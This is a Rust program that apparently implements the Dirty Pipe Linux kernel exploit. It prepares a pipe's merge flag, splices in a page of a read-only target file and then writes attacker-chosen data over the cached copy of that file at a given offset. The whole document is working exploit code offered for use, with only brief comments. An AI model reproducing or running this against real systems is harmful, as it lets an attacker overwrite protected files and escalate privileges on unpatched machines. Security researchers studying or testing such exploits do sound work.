use libc::{SYS_getpid, splice, syscall, open, O_RDONLY, c_char, loff_t};
use std::io::{pipe, Read, Write};
use std::os::fd::AsRawFd;
use anyhow::{Result, anyhow};
use std::fs;
use std::ffi::CString;
use std::ptr::null_mut;
use std::path::PathBuf;
use structopt::StructOpt;

const PIPE_SIZE: usize = 65536;

#[derive(Debug, StructOpt)]
#[structopt(name = "example", about = "An example of StructOpt usage.")]
struct Opt {
    /// Mode. Can be "overwrite"
    #[structopt(short, long)]
    mode: String,

    /// Input file. This data is what is written to the overwritten file.
    #[structopt(short, long, required_if("mode", "overwrite"))]
    input: PathBuf,

    /// Output file. The file to overwrite.
    #[structopt(short, long, required_if("mode", "overwrite"))]
    output: PathBuf,

    /// Offset to begin overwriting.
    #[structopt(short="b", long, required_if("mode", "overwrite"))]
    offset: i64,
}

fn main() -> Result<()> {
    let opt = Opt::from_args();

    // Read input file.
    let input_string = fs::read_to_string(&opt.input)?;

    // Create pipe
    let (mut dirty_pipe_rx, mut dirty_pipe_tx) = pipe()?;
    println!("Created pipe.");

    // Fill with some data to set the PIPE_FLAG_CAN_MERGE flag
    let mut data: Vec<u8> = vec![0u8; PIPE_SIZE];
    dirty_pipe_tx.write_all(&data);
    println!("Filled pipe.");

    // Drain pipe
    let bytes_read = dirty_pipe_rx.read(&mut data)?;
    println!("Drained (read) {} bytes", bytes_read);

    // Read the target file to enter it into page cache
    println!("{}", fs::read_to_string(&opt.output)?);

    // Splice data from target file into the pipe
    println!("Splicing...");
    unsafe {
        // Open file read only
        let file_path = CString::new(opt.output.to_str().unwrap())?;
        let fd = open(file_path.as_ptr(), O_RDONLY);
        println!("FD: {}", fd);

        // Splice
        let mut offset: loff_t = opt.offset; // Needs to be page aligned
        let num_bytes = splice(fd, &mut offset, dirty_pipe_tx.as_raw_fd(), null_mut(), input_string.len(), 0);
        println!("Bytes spliced: {}", num_bytes);
    }

    // Write arbitrary data into the pipe.
    // This overwrites the cached file page instead of
    // creating a new one (due to merge flag).
    dirty_pipe_tx.write_all(input_string.as_bytes())?;
    drop(dirty_pipe_tx);
    let mut buf = String::new();
    dirty_pipe_rx.read_to_string(&mut buf)?;
    println!("{}", buf);

    println!("File contents after overwrite attempt:");
    println!("{}", fs::read_to_string(opt.output)?);

    Ok(())
}
